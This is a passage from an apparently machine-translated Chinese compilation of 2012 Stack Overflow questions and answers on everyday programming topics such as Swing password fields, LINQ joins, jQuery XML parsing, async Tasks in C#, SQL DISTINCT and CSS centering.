toggleReadonly($(this), false); //set modifiable 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-14T18:02:04.210

我也是Jquery的初学者。您可以尝试将输入放入某个变量中，例如

```
var item = this.value; 
```

在您的代码中，按钮在哪里？

# java - 如何在 swing 组件的 JTextField 中输入特殊字符作为密码？

> ID：12429567
> 
> 赞同：2
> 
> 时间：2012-09-14T17:51:55.437
> 
> 标签：java, swing, jtextfield, jpasswordfield

当我们在任何帐户中输入密码时，字符不会显示给我们。我创建了一个标签为“密码”的 JTextField。当我在这个 JTextField 中输入字符时，我该怎么做`"***********"`？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-14T17:54:16.760

不要使用普通的`JTextField`，使用`JPasswordField`.

*   [如何使用密码字段](http://docs.oracle.com/javase/tutorial/uiswing/components/passwordfield.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-14T18:29:45.457

我认为解决问题的方法是使用`JPasswordField`

**请参阅此文档：**

[http://docs.oracle.com/javase/6/docs/api/javax/swing/JPasswordField.html](http://docs.oracle.com/javase/6/docs/api/javax/swing/JPasswordField.html)

**请参阅这些教程：**

www.java2s.com/Tutorial/Java/0240_Swing/0300_JPasswordField.htm *_* _

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-22T08:52:08.093

使用 JPasswordField 但您可以使用此代码将 Char 转换为 String；

字符串密码 = String.valueOf(jPasswordField.getPassword());

# iphone - 需要 AVFoundation 的基础知识来从设备摄像头捕获图像

> ID：12429570
> 
> 赞同：1
> 
> 时间：2012-09-14T17:52:08.230
> 
> 标签：iphone, cocos2d-iphone, avfoundation, cclayer, isight

我想知道我们如何使用 AVFoundation 框架捕获图像，我已经成功地激活了相机并且我的 Cocos2D 视图在相机上方并且是透明的。我尝试过使用一些教程，但无法捕获图像（静止图像）。我不想捕获视频的图像，我想要一个正常的相机功能，即单击图像然后将它们保存到相机胶卷。

两天以来我一直在尝试这个，我真的被困住了，当我按下捕捉按钮时，我在相机胶卷中唯一得到的是空白屏幕。

请向我推荐任何涵盖如何使用 AVFoundation 框架的基础知识的教程，或者任何帮助将不胜感激。:)

谢谢你的时间。:)

# c# - 如何使用 LINQ 扩展方法创建多个连接？

> ID：12429579
> 
> 赞同：1
> 
> 时间：2012-09-14T17:52:52.993
> 
> 标签：c#, linq, entity-framework

我在使用具有多个连接的 LINQ 方法调用时遇到问题。我正在尝试做这样的事情：

```
 if (!isDepSelect)
            {                
                query = (from Items in db.DEPARTMENTs
                             select Items);
            }
            else
            {                    
                    query = (from Items in db.DEPARTMENTs
                             from gDept in db.DEPT_PROFILE
                             from wAccess in db.WEB_ACCESS
                             where Items.DEPT_CODE == gDept.DEPT_CODE && gDept.USER_ID == wAccess.USER_ID && wAccess.EMP_ID == id
                             select Items);
            } 
```

我这样做了：

```
IQueryable<DEPARTMENT> query = db.DEPARTMENTs;

            if (isDepSelect)
            { 
                query = query.Join(db.DEPT_PROFILE,depts => depts.DEPT_CODE,prof => prof.DEPT_CODE,(depts, prof) => depts);    
            } 
```

但是现在我不知道如何将DEPT_PROFILE表的JOIN与WEB_ACCESS表以及EMP_ID = id的条件相加。

我这样做的原因是 isDepSelect 布尔值不是此查询将更改其关系的唯一条件，我需要以某种方式添加此关系，而无需为每个条件重复我的 LINQ。

感谢您的时间。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T19:00:38.717

尝试，

```
List<DEPARTMENTs> list =   db.DEPARTMENTs.Join(db.DEPT_PROFILE, dept => dept.DEPT_CODE, prof => prof.DEPT_CODE, (dept,prof) => new {dept, prof})
            .Join(Wdb.WEB_ACCESS, depts => depts.prof.USER_ID,web => web.USER_ID,(depts,web) => new { depts, web})
            .Where(result => result.web.EMP_ID== id).Select(s => s.depts.dept).ToList<DEPARTMENTs>(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T19:42:23.250

如果你有你的关联设置，你可以在你的代码中完全不加入任何连接：

```
query = db.DEPARTMENTs
           .Any(item => item.DEPT_PROFILEs
                .Any(gDept => gDept.WEB_ACCESSs
                     .Any(wAccess => wAccess.EMP_ID == id))); 
```

当然，这是假设图中每个对象之间的关系为 1 米。如果图表中存在 1-0..1 关系，您可以根据需要消除一些 Any 方法。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-14T18:16:00.050

你应该使用等号运算符...

```
query = from Items in db.DEPARTMENTs
                             from gDept in db.DEPT_PROFILE
                             join wAccess in db.WEB_ACCESS on 
gDept.DEPT_CODE equals Items.DEPT_CODE
                             select Items; 
```

这只是您的示例查询的一个片段，但您可以看到我是如何使用连接运算符来引入第二个表和使用等于运算符来声明连接列的。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-18T14:59:54.080

这应该有效：

```
 query = (from Items in db.DEPARTMENTs 
             join gDept in db.DEPT_PROFILE 
                on Items.DEPT_CODE equals gDept.DEPT_CODE
             join wAccess in db.WEB_ACCESS
                on gDept.USER_ID equals wAccess.USER_ID
             where  wAccess.EMP_ID == id
             select Items); 
```

# jquery - 简单的 Jquery 和 XML。阿贾克斯

> ID：12429581
> 
> 赞同：0
> 
> 时间：2012-09-14T17:53:11.223
> 
> 标签：jquery, ajax

我已经在互联网上搜索了几个小时，只能找到复杂的 Ajax。我需要在一小时内完成这项测试，以完成我在学校进行的一项测试，但无法解决这个问题。这是我的 XML

```
<?xml version="1.0" encoding="utf-8" ?>
<cookies>
  <cookie>
    <name>cookie name #1</name>
    <type>cookie type #1</type>
  </cookie>
  <cookie>
    <name>cookie name #2</name>
    <type>cookie type #2</type>
  </cookie>
  <cookie>
    <name>cookie name #3</name>
    <type>cookie type #3</type>
  </cookie>
</cookies> 
```

我需要做的就是获取cookie“名称”和“类型”并将它们放在这样的div中

```
<div id="something"><p></p><p></p></div> 
```

所以我需要的是第一个 p 中的名称和第二个 p 中的类型。我还需要一个 if 或 each 语句，这样我就可以解释所有的 cookie。我知道这很简单，但它会帮助我通过测试并进入 AJAX 并帮助我更好地理解它！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:10:34.870

```
$.get('/cookies.xml', function(xmldata) {
    $(xmldata).find('cookie').each(function(){
        $('body').append(
            '<div><p>'+$(this).find('name').text()+'</p><p>'+$(this).find('type').text()+'</p></div>'
        );
    });
}, 'xml'); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-14T17:58:25.507

简单的 AJAX 教程：[http](http://www.w3schools.com/ajax/default.asp) ://www.w3schools.com/ajax/default.asp 他们的第一个示例非常简单，它甚至无法满足您的要求——不过稍后会详细介绍。

# winforms - 在 Windows 窗体中动态绑定 DataGridView

> ID：12429587
> 
> 赞同：1
> 
> 时间：2012-09-14T17:53:44.707
> 
> 标签：winforms

我想在运行时将 DataTable 绑定到 Windows 窗体中。我在运行时创建了表单并试图将数据表绑定到表单的网格视图中。但它没有在表单中显示数据。我使用了以下代码：

```
frmSearch frm = new frmSearch();
for (int i = 0; i < erpData.ERPDataTable.Columns.Count; i++)
{
    frm.Controls["grdSearch"].DataBindings
        .Add("DataSource", erpData.ERPDataTable,
                         erpData.ERPDataTable.Columns[i].ToString());
}

frm.Show(); 
```

可能是什么问题呢？谁能提供替代解决方案？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T20:41:07.363

您可以通过三个步骤将 DataGridView 绑定到某个数据源：

```
// Create a binding source
var bs = new BindingSource();

// set the bindingsource's datasource, in this case your table
bs.DataSource = erpData.ERPDataTable;

// set the datagridview's datasource, DataSource isn't a property on Control,
// so cast the one you get from your form's Controls collection as a DataGridView
var dgv = (DataGridView)frm.Controls["grdSearch"];
dgv.DataSource = bs; 
```

[关于绑定 DataGridView 的 MSDN 参考](http://msdn.microsoft.com/en-us/library/fbk67b6z.aspx)

# html - 如何下载维基百科文章并存储在数据库中

> ID：12429594
> 
> 赞同：2
> 
> 时间：2012-09-14T17:54:03.970
> 
> 标签：html, xml, database, text, wikipedia

我有这个网络应用程序，用户（主要是英语学习者或儿童）可以在我的数据库中搜索一些现有的许可文章。它们可以按类别、标签以及每个标签的难度进行过滤。

因此，我正在考虑将 Wikipedia 中的文章添加到数据库中，并且能够不时更新我数据库中的文章，但我不确定什么是最好的方法。我的理解是我每次都需要下载压缩文件然后解压，这样我才能得到XML格式的文章。那么我可以根据标签将它们添加到数据库中吗？有没有办法让它自动更新？我读了这篇文章，但是关于数据转储，但不知道如何开始。

[http://en.wikipedia.org/wiki/Wikipedia:Database_download#SQL_schema](http://en.wikipedia.org/wiki/Wikipedia:Database_download#SQL_schema)

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-09-14T18:00:52.453

或许仅仅爬取和索引维基百科会更好。然后，您可以在 Apache Solr 等系统中存储*您关心*的页面的搜索索引。如果您这样做，请**务必对您的请求率保持礼貌**，

这避免了存储并且不需要努力更新内容。只有链接需要更新（可能频率要低得多）。

如果您不想过滤人们找到的内容，那么您可能只需注册[Google 的搜索 API](https://developers.google.com/custom-search/v1/overview)并节省爬虫的时间/精力......

# c# - Assembly.CreateInstance 类型转换返回 null

> ID：12429603
> 
> 赞同：0
> 
> 时间：2012-09-14T17:54:29.337
> 
> 标签：c#, .net-assembly

我正在尝试在运行时加载和使用 DLL，这工作正常：

```
var pluggin = asm2.CreateInstance("ParserTest.Interface", true) as iPluggin; 
```

但这不是（我需要遍历特定文件夹中的 DLL 文件以找到实现 iPluggin 接口的正确文件）：

```
...
var asm = Assembly.LoadFrom(dll.FullName);
if (asm.GetExportedTypes().FirstOrDefault(q => q.GetInterface(tName) != null) == null) continue;
Project.ProcessList.Add(asm.CreateInstance(tName, true) as iPluggin);
... 
```

在调试模式下做一些研究我发现：

```
asm.CreateInstance(tName, true) 
```

返回正确的对象，但在尝试将其强制转换为 iPluggin 时，结果为空。知道为什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:07:12.277

我做了类似的事情：

```
private readonly Type _pluginbaseType = typeof(BasePlugin);

public AssemblyPlugin(Assembly assembly)
{

    Type[] _plugins = _assembly.GetExportedTypes()
        .Where(t => t.BaseType.IsSubclassOf(_pluginbaseType)
        .ToArray();
} 
```

在此之后，您可以：

```
BasePlugin plugin = (BasePlugin)Activator.CreateInstance(pluginType); 
```

您应该更喜欢基类而不是接口。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:37:41.053

虽然我不明白，但谜题解决了。

定义接口 (SDK.dll) 的 DLL 也在被检查的范围之内。我在查询中手动删除了它，现在所有炒锅都按预期删除了。这是我的最终代码：

```
 var plugins =
        from fi in di.GetFiles("*.dll").Where(p => p.Name.ToUpper() != "SDK.DLL")
        let asm = Assembly.LoadFrom(fi.FullName)
        from t in asm.GetExportedTypes()
        where t.GetInterface(typeof(iPluggin).Name) != null
        select asm.CreateInstance(t.FullName, true) as iPluggin;
    Project.ProcessList.AddRange(plugins); 
```

# sql - 多表分组

> ID：12429615
> 
> 赞同：0
> 
> 时间：2012-09-14T17:55:36.267
> 
> 标签：sql, sql-server

我相信 Group By 可以解决以下问题，但也许是 Select Distinct。不管怎样，我恭敬地转向你：

目标：

通过协议合并，然后是 LaborCode，然后是 Schedule。我为一家提供多种服务的公司工作，我想选择任何日期范围，并指定我们每周执行每项服务的日期。在一个月的时间里，我们将有 (4) 个星期一 - 我只想看到一个星期一。附带说明一下，我尝试过 XML Path，但它似乎不起作用。

编码：

```
Select Top 100 Percent Agreements.AgrmntID, JobSites.SiteName,
  Customers.CompanyName, LaborCodeTypes.Description As LaborCode, DateName(dw,
  AgreementSchedules.SchedDate) as Schedule
From Agreements Inner Join
  AgreementSchedules On Agreements.AgrmntID = AgreementSchedules.AgrmntID
  Inner Join
  Customers On Agreements.CustID = Customers.CustID Inner Join
  JobSites On Agreements.CustSiteID = JobSites.CustSiteID Left Outer Join
  LaborCodeTypes On AgreementSchedules.RepairID = LaborCodeTypes.RepairID
Where Agreements.Status = 2 
```

数据（时间表源自 AgreementSchedules.SchedDate） - 选择了 2 周：

```
AgrmntID    SiteName   Company   LaborCode    Schedule
---------- ---------- ---------- ---------- ----------
1           JOB01      COMP01    Sweeping     Monday
1           JOB01      COMP01    Sweeping     Wednesday
1           JOB01      COMP01    Sweeping     Monday
1           JOB01      COMP01    Sweeping     Wednesday
1           JOB01      COMP01    Porter       Thursday
1           JOB01      COMP01    Porter       Thursday
2           JOB02      COMP02    Landscaping  Tuesday
2           JOB02      COMP02    Landscaping  Tuesday 
```

所需的输出：

```
AgrmntID    SiteName   Company   LaborCode    Schedule
---------- ---------- ---------- ---------- ----------
1           JOB01      COMP01    Sweeping     Monday
1           JOB01      COMP01    Sweeping     Wednesday
1           JOB01      COMP01    Porter       Thursday
2           JOB02      COMP02    Landscaping  Tuesday 
```

非常感谢你。几天来我一直试图解决这个问题，但没有运气。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:00:53.100

一个独特的应该在这里工作得很好..

仅供参考`Group by`，`Distinct`并且本质上是等价的（实际上这就是一些数据库实现 DISTINCT 的方式）。

注意，Distinct 更快，因为它不对结果进行排序

此外，使用 Distinct 更简洁，更易于阅读和维护。您的代码的其他读者将立即获得意图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:00:03.643

要么工作。

我会去 DISTINCT

```
Select DISTINCT Agreements.AgrmntID, JobSites.SiteName, 
  Customers.CompanyName, LaborCodeTypes...... 
```

# c++ - 想要读取超过 50,000 个 txt 文件并将它们保存在 C++ 中的链表中

> ID：12429621
> 
> 赞同：-2
> 
> 时间：2012-09-14T17:56:08.853
> 
> 标签：c++, arrays, linked-list

```
#include<iostream>
#include<windows.h>
#include<string>
#include<fstream>
using namespace std;
class linklist     //linked list class
{
    struct main_node;
    struct sub_node;

    struct main_node   // main node that only have head pointers in it
    {
        sub_node *head;
        main_node()
        {   head=NULL;  }
    };
    main_node array[26];
    struct sub_node
    {
        double frequency;
        string word;
        sub_node *next;
        sub_node()
        {   frequency=1;    word="";    next=NULL;  }
    };

public:
    void add_node(string phrase)
    {
        char alphabat1=phrase[0];
        if(isupper(alphabat1))
        {
            alphabat1=tolower(alphabat1);
        }
        if(!isalpha(alphabat1))
            return;

        sub_node*temp = new sub_node;
        temp->word = phrase;

        sub_node*current = array[alphabat1-97].head;

        if(current == NULL)
        array[alphabat1-97].head = temp;

        else
        {
            while(current -> next != NULL && phrase != current-> word)
            {   current= current->next; }

            if(current->word == phrase)
                current->frequency++;
            else
                current->next  = temp; //adding words to linklist
        }
    }

    void display()
    {
        for(int i=0;i<26;i++)
        {
        sub_node *temp=array[i].head;
        cout<<char(i+97)<<" -> ";
        while(temp!=NULL)
        {
            cout<<temp->word<<" ("<<temp->frequency<<")  ";
            temp=temp->next;
        }
        cout<<"\n";
        }
    }
void parsing_documents(char *path)
{
    char token[100];
    ifstream read;
    read.open(path);
    do
    {
        read>>token;    // parsing words
        add_node(token);    //sending words to linked list

    }
    while(!read.eof());
        read.clear();
        read.close();
}
void reading_directory()
{
 // code to read multiple files

   HANDLE          hFile;                // Handle to file
   WIN32_FIND_DATA FileInformation;      // File information
   char tempPattern[90];
   strcpy(tempPattern,"*.txt");
   hFile = ::FindFirstFile(tempPattern, &FileInformation);
   long count=0;
   if(hFile != INVALID_HANDLE_VALUE)
   {
        do
        {
            count++;
            cout<<"."<<count;
            this->parsing_documents( FileInformation.cFileName);
        }
        while(TRUE == ::FindNextFile(hFile, &FileInformation));
   } 
    ::FindClose(hFile);

}
};
void main()
{
    linklist member;
    member.reading_directory();
    member.display();
} 
```

我正在做一个项目，我必须阅读超过 50,000 个文本文件来解析它们的单词并将它们以排序方式保存在链表中，我已经用 C++ 编写了代码。它的工作效率很高，但在这方面我有一个问题，它无法正确读取文件，有时 3000 有时 4000。我已经搜索了很多，但我无法找到我的错误。. 这是我在 C++ 中的代码，如果有人在这方面帮助我，我将非常感激

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:00:26.903

`!read.eof()`仅检查文件结尾，而不是读取文件的错误，例如网络挂载的文件系统未准备好、磁盘错误或缺少读取文件的权限。您应该检查所有故障，`while(read)`其中有一个重载的运算符来为您检查所有内容。因此，如果文件失败，您将停止尝试从中读取。您还应该在尝试从文件中读取*之前检查状态。*因此，`while(read) { ... }`它比 do/while 循环更可取。在循环之后，您可能会向您的用户发出警告或错误，因为您没有到达文件末尾，`!read.eof()`以便他们可以调查该特定文件。

尽量避免`char *`，`char []`因为这很容易出错。你有一个 char[100]。如果字符串长度超过 100 个字符会怎样？ `read >> token`可能会覆盖堆栈——例如损坏`ifstream read`.

考虑使用`std::list<sub_node>`以避免重新发明和重新调试轮子？您将不再需要下一个指针，因为 std::list 已经为您完成了。这将留下更少的代码来调试。

# c# - 如何正确编写自定义任务返回方法

> ID：12429622
> 
> 赞同：5
> 
> 时间：2012-09-14T17:56:20.050
> 
> 标签：c#, task-parallel-library, async-await

对于异步运行代码（例如使用 async/await），我需要一个适当的任务。当然，框架中有几个预定义的方法，涵盖了最常见的操作，但有时我想编写自己的方法。我是 C# 的新手，所以很可能我做错了，但我至少对我目前的做法并不完全满意。请参阅以下示例了解我在做什么：

```
public async Task<bool> doHeavyWork()
    {
        var b1 = await this.Foo();
        //var b2 = await Task<bool>.Factory.StartNew(Bar); //using Task.Run
        var b2 =  await Task.Run(()=>Bar());
        return b1 & b2;
    }

public Task<bool> Foo()
    {
        return Task.Factory.StartNew(() =>
                                  {
                                      //do a lot of work without awaiting
                                      //any other Task
                                      return false;
                                  });
    }

public bool Bar()
    {
        //do a lot of work without awaiting any other task
        return false;
    } 
```

一般来说，我创建和使用像 Foo 示例这样的方法，但是有一个“额外”的 lambda 包含整个方法逻辑，看起来不太漂亮恕我直言。另一种选择是使用任何方法，如 Bar 示例，但我认为这更糟，因为不清楚该方法是否应该异步运行（除了正确的方法名称，如 BarAsync）并且 Task.Factory.StartNew 可能必须在程序中重复多次。我不知道如何告诉编译器“此方法返回一个任务，请在调用时将其作为一个整体包装到一个任务中”，这就是我想要做的。

最后我的问题是：编写这种方法的最佳方法是什么？我可以摆脱“额外”的 lambda（当然不添加额外的命名方法）吗？

**编辑** 正如 Servy 所说，拥有该方法的同步版本总是有充分的理由。只有在绝对必要时才应提供异步版本（Stephen Cleary 的链接）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T18:18:43.103

如果有人想打电话`Bar`而不在新线程/任务中启动它，世界会结束吗？如果后台线程中已经有另一种方法，因此它不需要启动新任务来运行那个长时间运行的代码怎么办？如果方法最终被重构为从桌面应用程序上下文以及 ASP 或控制台上下文调用的类库怎么办？在那些其他情况下，该方法可能只需要直接运行，而不是作为`Task`.

我会说你的代码应该看起来像`Bar`那里，除非绝对必要的是，在任何情况下，都应该在不启动新的`Task`.

另请注意，对于较新版本的 .NET，您应该从 切换`Task.Factory.StartNew`到`Task.Run`，因此代码量应该会减少（一点点）。

# javascript - 从 JavaScript 访问我的 struts 操作中的属性

> ID：12429624
> 
> 赞同：0
> 
> 时间：2012-09-14T17:56:25.110
> 
> 标签：javascript, jquery, struts

我仍在尝试了解客户端服务器通信如何与 JSP/js 和 Struts 一起工作。我的操作中有一个 Struts 属性，我可以使用它显示在我的页面上。据我了解，这是通过在我的操作中查找名为 getMyMessage() 的方法来工作的。所以这对我来说没问题。我现在希望能够从我的 Javascript 中访问该值，以便在页面加载时动态填充测试区域。我用

```
$(document).ready(function( data )
{
$('#contextsTextArea').html(data.myMessage);
}); 
```

但这不起作用。我知道我可以在我的 JSP 中分配一个 var 来存储 struts 属性并在我的 JS 中引用这个 var，但是有没有更简洁的方法来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:06:56.400

如果您在谈论，`textarea`则必须`.val()`改用。像下面这样。 `$('#contextsTextArea').val(data.myMessage);`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T20:35:35.543

JSP 在服务器上运行，JavaScript 在您的浏览器中运行。

您不能在 JavaScript 中使用像“myMessage”这样的 JSP 变量作为变量。但是，您可以将其转换为服务器上的文本，以便当它到达您的浏览器时它可以作为 JS 工作。所以，试试这样的事情：

```
$('#contextsTextArea').val('<s:property value="myMessage"/>') 
```

在服务器上处理此 JSP 时，JS 代码将保留为文本，而标记将转换为 myMessage 变量中的文本。

请注意，您确实需要 JS 转义 myMessage 否则，例如，如果消息包含单引号，则 JS 将中断。

查看您的页面源代码以了解此处发生的情况。

# php - 如何在 Javascript 中使简单的 php 的 foreach 等效？

> ID：12429626
> 
> 赞同：7
> 
> 时间：2012-09-14T17:56:27.353
> 
> 标签：php, javascript, loops

> **可能重复：**
> [循环遍历 JavaScript 中的数组](https://stackoverflow.com/questions/3010840/loop-through-array-in-javascript)

我想在javascript中制作相当于php的foreach。因为我并不真正了解 Javascript 语言，所以我希望有人将这段 PHP 代码重写为 Javascript 代码：

```
$my_array = array(2 => 'Mike', 4 => 'Peter', 7 => 'Sam', 10 => 'Michael');

foreach($my_array as $id => $name)
{
     echo $id . ' = ' . $name;
} 
```

这甚至可以用 Javascript 语言来实现吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-14T17:57:37.750

最接近的构造是

```
a = { 2: 'Mike', 4: 'Peter', 7: 'Sam', 10: 'Michael' };
for(var n in a) {
    console.log(n+'='+a[n]);
} 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-09-14T17:58:42.553

在 JQuery 中，`$.each`功能类似。

它允许您使用可以访问每个项目的回调函数来迭代数组：

```
var arr = ["one", "two", "three", "four", "five"];
$.each(arr, function(index, value) {
  // work with value
}); 
```

对于纯 Javascript？

```
for (var key in obj) {
    alert(key + ': ' + obj[key]);
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-14T18:09:05.200

因为你存在两种方式。

首先是数据在对象中（例如它在 my_list 中），其次是数据正好在数组中（例如它是 my_array）

在任何情况下，您都可以使用 JavaScript For...In 语句

例子：

```
<script type="text/javascript" charset="utf-8">
    var data;
    var my_list  = {2:'Mike', 4:'Peter', 7:'Sam', 10:'Michael'};
    var my_array = new Array();
    my_array[2]  = 'Mike';
    my_array[4]  = 'Peter';
    my_array[7]  = 'Sam'; 
    my_array[10] = 'Michael';

    data = '';
    for(index in my_list) {
        data += (index+'='+my_list[index]+"\n");
    }
    console.log(data);

    data = '';
    for(index in my_array) {
        data += (index+'='+my_array[index]+"\n");
    }
    console.log(data);
</script> 
```

在这两种情况下，控制台输出将是：

```
2=Mike
4=Peter
7=Sam
10=Michael 
```

其实请阅读[http://www.w3schools.com/js/js_loop_for_in.asp](http://www.w3schools.com/js/js_loop_for_in.asp)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-14T18:03:48.677

见下面网址

[foreach 相当于 jquery 中的 php？](https://stackoverflow.com/questions/1198436/foreach-equivalent-of-php-in-jquery)

**或者试试**

如果你想迭代一个对象，我会推荐 JavaScript 变体：

```
for (var key in obj) {
    alert(key + ': ' + obj[key]);
} 
```

你也可以像这样在 jQuery 中迭代对象：注意！除非您认为这种语法更易于维护，否则这样做毫无意义。下面的语法比上面的标准 JavaScript for-loop 有更多的开销。

```
$.each(obj, function (key, value) {
    alert(key + ': ' + value);
}); 
```

要迭代数组，您可以在标准 JavaScript 中这样做（假设 arr 是数组）：

```
for (var i = 0, l = arr.length; i < l; i++) {
    alert(i + ': ' + arr[i]);
} 
```

要在 jQuery 中执行此操作，您可以这样做：

```
$.each(arr, function (index, value) {
    alert(index + ': ' + value);
}); 
```

# caching - 如何缓存所有查看用户请求，所以如果再次发出相同的请求，它会从缓存中获取

> ID：12429628
> 
> 赞同：1
> 
> 时间：2012-09-14T17:56:41.570
> 
> 标签：caching, request, xpages, xpages-ssjs, session-scope

我有相当大的应用程序，其中包含大量文档和许多不同的视图控件。

为了加快速度并避免不必要的查看和查看搜索请求，我想缓存已经请求的文档或查看条目，因此如果用户再次执行相同的请求，则重复首先在缓存中查找。

我正在考虑编写一个通用函数，将所有请求的 unid 存储在 sessionScope 中，当我的应用程序从文档中检索值而不是查看列值时，我可以将其应用于所有视图集合。

我想这种功能需要跟踪发出的请求并在用户需要更多行时切换回非缓存内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T14:00:30.703

您需要开发一个 Bean（Java 类）并将您的控件绑定到 Bean，而不是直接绑定到 View 和 Document 数据源。在 bean 内部，您可以维护已加载的视图/文档的缓存。

# center - CSS：如何使文本与周围的边框居中

> ID：12429633
> 
> 赞同：2
> 
> 时间：2012-09-14T17:57:07.487
> 
> 标签：center, css

我正在尝试将有一条线穿过整个背景的文本居中。在文本的两侧，有一些填充，您根本看不到该行。对于一个好的 CSS-only 方法，我很难过。这是一个明显错误的 jsfiddle，但它是一个开始：http: [//jsfiddle.net/gtspk/](http://jsfiddle.net/gtspk/)

![在此处输入图像描述](../Images/cc5690f092651b7eb4ed2a4d0f31b4a4.png)

**HTML**

```
<span class="line">
    <h2>Latest Track</h2>
</span> 
```

**CSS**

```
.line{display:block; width:100%; border-bottom:1px solid red; margin-top:25px; text-align:center}
.line h2{font-size:15px; text-align:center; position:relative; top:10px; padding:0 15px; display:inline-block; background:white} 
```

这里的问题是我不想指定宽度，因为我将针对不同的标题（具有不同数量的文本）重用它。通过css解决这个问题的最佳方法是什么？

更新：这是一种方法，但 inline-block 的浏览器支持相当糟糕：http: [//jsfiddle.net/gtspk/3/](http://jsfiddle.net/gtspk/3/)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-14T18:02:43.873

干得好。必须添加一个环绕跨度（这是必要的，所以我们可以将背景设置为白色，这样行就不会碰到文本）

[http://jsfiddle.net/gtspk/9/](http://jsfiddle.net/gtspk/9/)

```
<span class="line">
    <h2><span>Latest Track</span></h2>
</span>​

.line{display:block; margin:25px}
.line h2{font-size:15px; text-align:center; border-bottom:1px solid red; position:relative; }
.line h2 span { background-color: white; position: relative; top: 10px; padding: 0 10px;} 
```

对，对不起，误解了你所说的填充的意思。已修复。​</p>

# css - 只用 CSS 和 HTML 重现 jQuery UI 爆炸动画？

> ID：12429638
> 
> 赞同：1
> 
> 时间：2012-09-14T17:57:56.680
> 
> 标签：css, ios, jquery-ui, cordova

是否可以仅使用 HTML 和 CSS3 从 jQuery UI 插件重新创建爆炸动画？

我们希望将此效果包含在为 iOS 设备构建的 PhoneGap 应用程序中，如果可能的话，我们更喜欢纯 CSS 解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:08:03.243

不可能的。您至少需要对这些效果有 JavaScript 支持。

# windows - R for Windows 的“当前版本”和“安装路径”注册表项用于什么？

> ID：12429641
> 
> 赞同：4
> 
> 时间：2012-09-14T17:58:05.187
> 
> 标签：windows, r, registry

这是我要询问的两个注册表项。**

```
HKEY_LOCAL_MACHINE\Software\R-core\R\Current Version
HKEY_LOCAL_MACHINE\Software\R-core\R\version\InstallPath 
```

当 R 从命令行（或从**emacs**或**statconnDCOM**）启动时，它使用 Windows`Path`环境变量中首先出现的任何版本。相比之下，双击`*.Rdata`文件使用`HKEY_CLASSES_ROOT`.

但是这两个`HKEY_LOCAL_MACHINE`条目是什么时候使用的，或者是什么时候使用的呢？

**编辑：** Brian Diggs 指向一组`*.bat`确实使用（并修改）这些注册表项的 Windows 文件，但我仍然对是否有更接近“核心”R 的东西使用这些感兴趣。（我希望答案是“不”。）

* * *

** 如[R for Windows FAQ](http://cran.r-project.org/bin/windows/base/rw-FAQ.html#Does-R-use-the-Registry_003f)中所述，这些条目可以在安装过程中（通过单击“在注册表中保存版本号”）或稍后从命令行（通过`RSetReg.exe`在内部键入`$RHOME\bin`）设置。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T19:58:18.407

**主要编辑：**

看起来这些注册表项主要是供外部应用程序使用的。

这就是我这么认为的原因。

1.  R 源代码中的grep'ing`HKEY_LOCAL_MACHINE`仅在三个文件中出现了四个命中。文件 -- `"extra.c"`、`"RSetReg.c"`和`"rhome.c"`-- 都位于`R-2.15.0/src/gnuwin/`或其子目录中。

2.  相关的出现似乎是`R-2.15.0/src/gnuwin/rhome.c`在 C 函数使用它的地方`get_R_HOME`。该功能旨在

    > /* 从环境或注册表中获取 R_HOME：用于嵌入式应用程序 */

    `R_HOME`并且仅当尚未在“C 环境空间”或“Windows API 环境空间”中找到它时才在注册表中搜索。

3.  `get_R_HOME`反过来，只出现在另外两个文件中`"R-2.15.0/src/gnuwin/embeddedR.c"`， 和`"R-2.15.0/src/gnuwin/front-ends/rtest.c"`。（根据其驻留`readme`文件， 的作用`"R-2.15.0/src/gnuwin/front-ends/"`是使“将 R DLL 链接到其他应用程序”成为可能。）

4.  R 的 *NIX 起源和对可移植性的强调使得任何接近 R 核心功能的东西都不太可能依赖于注册表项。（这个项目显然更具投机性。）

除非我听到其他消息，否则这足以让我相信注册表项的唯一目的是为外部应用程序提供指针，尤其是那些使用 R 嵌入式实例的应用程序。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:07:26.610

使用这些的一组程序是[R 批处理文件](https://code.google.com/p/batchfiles/)，它声明

> 这些程序通过 (1) 检查环境变量 (R_HOME、R_MIKTEX、R_TOOLS) 或 (2) 如果未设置，则在注册表中设置 R 的版本（以及 R Tools 和 miktex 的版本）。

# eclipse - 如何设置 Eclipse 用于本地帮助服务器的端口？

> ID：12429644
> 
> 赞同：3
> 
> 时间：2012-09-14T17:58:15.187
> 
> 标签：eclipse

有没有办法设置 Eclipse 为其本地帮助服务器使用的端口（例如 localhost:64219/help/index.jsp）？我想为特定页面添加书签，但我显然不能，因为每次运行时端口都会更改。

